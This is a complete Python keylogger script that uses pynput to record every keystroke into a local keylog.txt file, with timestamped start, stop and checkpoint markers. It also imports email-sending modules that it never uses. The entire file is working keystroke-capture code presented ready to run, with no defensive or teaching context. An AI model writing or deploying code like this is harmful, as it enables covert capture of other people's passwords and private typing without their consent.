import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class AdvancedKeylogger:
    def __init__(self, time_interval=60, log_file="keylog.txt"):
        self.log_file = log_file
        self.interval = time_interval
        self.is_running = True
        
        
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(f"\n{'='*50}\n")
            file.write(f"Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            file.write(f"{'='*50}\n\n")

    def append_to_log(self, string):
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(string)

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.enter:
                current_key = "\n"
            elif key == key.backspace:
                current_key = " [BACKSPACE] "
            elif key == key.tab:
                current_key = " [TAB] "
            elif key == key.esc:
                # Stop keylogger when ESC is pressed
                self.stop()
                return
            else:
                current_key = f" [{str(key)}] "
        
        self.append_to_log(current_key)

    def on_release(self, key):
        # Stop listener when ESC is released
        if key == pynput.keyboard.Key.esc:
            return False

    def report(self):
        if self.is_running:
            with open(self.log_file, "a", encoding="utf-8") as file:
                file.write(f"\n[Checkpoint: {datetime.now().strftime('%H:%M:%S')}]\n")
            
            # Schedule next report
            self.timer = threading.Timer(self.interval, self.report)
            self.timer.start()

    def start(self):
        print(" Advanced Keylogger Started!")
        print(" Press ESC to stop")
        print(f" Logging to: {self.log_file}")
        
        # Start the reporting thread
        self.report()
        
        # Start the keyboard listener
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

    def stop(self):
        self.is_running = False
        if hasattr(self, 'timer'):
            self.timer.cancel()
        
        with open(self.log_file, "a", encoding="utf-8") as file:
            file.write(f"\n{'='*50}\n")
            file.write(f"Keylogger Stopped: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            file.write(f"{'='*50}\n\n")
        
        print("\n Keylogger Stopped")
        print(f" Logs saved to: {self.log_file}")

# Start keylogger immediately when script runs
if __name__ == "__main__":
    keylogger = AdvancedKeylogger(
        time_interval=30,      
        log_file="keylog.txt"  
    )
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        keylogger.stop()
